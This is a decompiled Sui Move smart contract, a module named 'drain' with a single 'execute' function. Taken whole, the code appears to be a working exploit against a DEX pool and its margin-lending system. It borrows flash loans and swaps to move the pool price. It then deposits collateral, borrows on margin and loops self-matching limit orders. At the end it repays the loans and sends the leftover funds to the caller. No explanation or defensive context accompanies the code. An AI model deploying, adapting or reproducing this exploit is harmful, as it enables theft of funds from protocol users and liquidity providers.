module 0xda5173744b461c1fe3a643535372a36afbb5fcc071b1c32cb19ee44319b57fbd::drain {
    public fun execute<T0, T1>(arg0: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<T0, T1>, arg1: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_registry::MarginRegistry, arg2: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::MarginManager<T0, T1>, arg3: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::BalanceManager, arg4: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_pool::MarginPool<T1>, arg5: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::price_info::PriceInfoObject, arg6: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::price_info::PriceInfoObject, arg7: u64, arg8: u64, arg9: u64, arg10: u64, arg11: u64, arg12: u64, arg13: &0x2::clock::Clock, arg14: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::pool_book_params<T0, T1>(arg0);
        let (v3, v4, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::vault_balances<T0, T1>(arg0);
        assert!(v3 > 0 && v4 > 0, 100);
        let v6 = v3 * arg7 / 100 / v1 * v1;
        let v7 = v4 * arg8 / 100;
        assert!(v6 > 0 && v7 > 0, 101);
        let v8 = v7 * arg9 / 100;
        let v9 = v7 * arg10 / 100;
        let v10 = v8 * arg11;
        let (v11, v12) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_base<T0, T1>(arg0, v6, arg14);
        let v13 = v11;
        let (v14, v15) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_quote<T0, T1>(arg0, v7, arg14);
        let v16 = v14;
        let (v17, _, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::vault_balances<T0, T1>(arg0);
        let v20 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::mid_price<T0, T1>(arg0, arg13);
        let v21 = if (v20 > 0) {
            v17 / 1000000 * v20 / 1000 * 80 / 100
        } else {
            0
        };
        let v22 = if (v9 < v21) {
            v9
        } else {
            v21
        };
        if (v22 > 0 && 0x2::coin::value<T1>(&v16) >= v22) {
            let (v23, v24, v25) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_quote_for_base<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v16, v22, arg14), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg14), 0, arg13, arg14);
            0x2::coin::join<T0>(&mut v13, v23);
            0x2::coin::join<T1>(&mut v16, v24);
            0x2::transfer::public_transfer<0x2::coin::Coin<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>>(v25, 0x2::tx_context::sender(arg14));
        };
        let v26 = v6 * 15 / 100 / v1 * v1;
        if (v26 > 0 && 0x2::coin::value<T0>(&v13) >= v26) {
            let (v27, v28, v29) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_base_for_quote<T0, T1>(arg0, 0x2::coin::split<T0>(&mut v13, v26, arg14), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg14), 0, arg13, arg14);
            0x2::coin::join<T0>(&mut v13, v27);
            0x2::coin::join<T1>(&mut v16, v28);
            0x2::transfer::public_transfer<0x2::coin::Coin<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>>(v29, 0x2::tx_context::sender(arg14));
        };
        let (_, _, v32, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_level2_ticks_from_mid<T0, T1>(arg0, 1, arg13);
        let v34 = v32;
        let (v35, _, _, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_level2_ticks_from_mid<T0, T1>(arg0, 1, arg13);
        let v39 = v35;
        assert!(!0x1::vector::is_empty<u64>(&v34) && !0x1::vector::is_empty<u64>(&v39), 300);
        let v40 = (*0x1::vector::borrow<u64>(&v34, 0) - v0) / v0 * v0;
        let v41 = (*0x1::vector::borrow<u64>(&v39, 0) + v0) / v0 * v0;
        assert!(v40 > v41, 301);
        assert!(0x2::coin::value<T1>(&v16) >= v8, 400);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::update_current_price<T0, T1>(arg1, arg0, arg5, arg6, arg13);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::deposit<T0, T1, T1>(arg2, arg1, arg5, arg6, 0x2::coin::split<T1>(&mut v16, v8, arg14), arg13, arg14);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::borrow_quote<T0, T1>(arg2, arg1, arg4, arg5, arg6, arg0, v10, arg13, arg14);
        let v42 = 0x2::coin::value<T0>(&v13);
        assert!(v42 > 0, 500);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::deposit<T0>(arg3, v13, arg14);
        let v43 = v42 * 85 / 100 / v1 * v1;
        let v44 = v43 * 999 / 1000 / v1 * v1;
        assert!(v43 > 0 && v44 > 0, 500);
        let v45 = v8 + v10;
        let v46 = v43 / 1000 * v40 / 1000 / 1000;
        let v47 = v44 / 1000 * v41 / 1000 / 1000;
        let v48 = if (v46 > v47) {
            v46 - v47
        } else {
            1
        };
        let v49 = if (v45 > v46) {
            (v45 - v46) / v48
        } else {
            0
        };
        let v50 = if (arg12 < v49) {
            arg12
        } else {
            v49
        };
        assert!(v50 > 0, 800);
        let v51 = 0;
        while (v51 < v50) {
            let v52 = v51 * 10;
            let v53 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg14);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<T0, T1>(arg0, arg3, &v53, v52, 0, 0, v40, v43, false, false, 18446744073709551615, arg13, arg14);
            0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::place_limit_order<T0, T1>(arg1, arg2, arg0, v52 + 1, 1, 0, v40, v43, true, false, 18446744073709551615, arg13, arg14);
            let v54 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg14);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v54, arg13, arg14);
            let v55 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg14);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v55);
            assert!(0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::balance<T1>(arg3) > 0, 600);
            let v56 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg14);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<T0, T1>(arg0, arg3, &v56, v52 + 2, 0, 0, v41, v44, true, false, 18446744073709551615, arg13, arg14);
            0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::place_limit_order<T0, T1>(arg1, arg2, arg0, v52 + 3, 1, 0, v41, v44, false, false, 18446744073709551615, arg13, arg14);
            let v57 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg14);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v57, arg13, arg14);
            let v58 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg14);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v58);
            v51 = v51 + 1;
        };
        let v59 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg14);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v59, arg13, arg14);
        let v60 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg14);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v60);
        let v61 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T0>(arg3, arg14);
        let v62 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T1>(arg3, arg14);
        let v63 = 0x2::coin::value<T1>(&v62) / 50;
        if (v63 > 0) {
            let (v64, v65, v66) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_quote_for_base<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v62, v63, arg14), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg14), 0, arg13, arg14);
            0x2::coin::join<T0>(&mut v61, v64);
            0x2::coin::join<T1>(&mut v62, v65);
            0x2::transfer::public_transfer<0x2::coin::Coin<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>>(v66, 0x2::tx_context::sender(arg14));
        };
        assert!(0x2::coin::value<T0>(&v61) >= v6, 700);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_base<T0, T1>(arg0, 0x2::coin::split<T0>(&mut v61, v6, arg14), v12);
        0x2::coin::join<T1>(&mut v62, v16);
        assert!(0x2::coin::value<T1>(&v62) >= v7, 701);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_quote<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v62, v7, arg14), v15);
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v61, 0x2::tx_context::sender(arg14));
        0x2::transfer::public_transfer<0x2::coin::Coin<T1>>(v62, 0x2::tx_context::sender(arg14));
    }

    // decompiled from Move bytecode v7
}

